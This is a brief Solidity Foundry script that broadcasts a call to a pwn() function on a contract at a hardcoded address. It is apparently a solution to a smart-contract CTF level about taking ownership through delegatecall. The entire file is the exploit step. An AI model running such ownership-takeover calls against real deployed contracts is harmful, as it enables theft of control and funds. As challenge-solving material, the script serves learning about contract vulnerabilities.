// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

interface IDelegate {
    function pwn() external;
}
contract CounterScript is Script {


    function run() public {
        vm.startBroadcast();
        IDelegate target = IDelegate(0xeE6e5913178eE970e71c74e02e87D72df80a93D7);
        target.pwn();
        vm.stopBroadcast();
    }
}
